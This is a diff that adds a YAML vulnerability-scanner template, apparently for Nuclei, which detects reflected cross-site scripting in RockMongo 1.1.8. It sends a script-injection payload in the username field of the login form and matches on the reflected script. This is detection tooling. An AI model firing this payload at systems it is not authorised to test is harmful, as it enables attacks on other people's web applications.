@@ -1,0 +1,29 @@
+id: rockmongo-xss
+name: RockMongo 1.1.8 - Cross-Site Scripting
+severity: high
+confidence: tentative
+description: RockMongo 1.1.8 contains a cross-site scripting vulnerability which allows attackers to inject arbitrary JavaScript
+  into the response returned by the application.
+reference: CWE-79
+tags:
+- rockmongo
+- xss
+- packetstorm
+- vuln
+requests:
+- method: POST
+  path: /index.php?action=login.index
+  matchers:
+  - type: body
+    words:
+    - '"><script>alert(document.domain)</script>'
+  - type: status
+    status:
+    - 200
+  - type: header
+    words:
+    - 'Content-Type: text/html'
+  condition: and
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  body: more=0&host=0&username=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=&db=&lang=en_us&expire=3
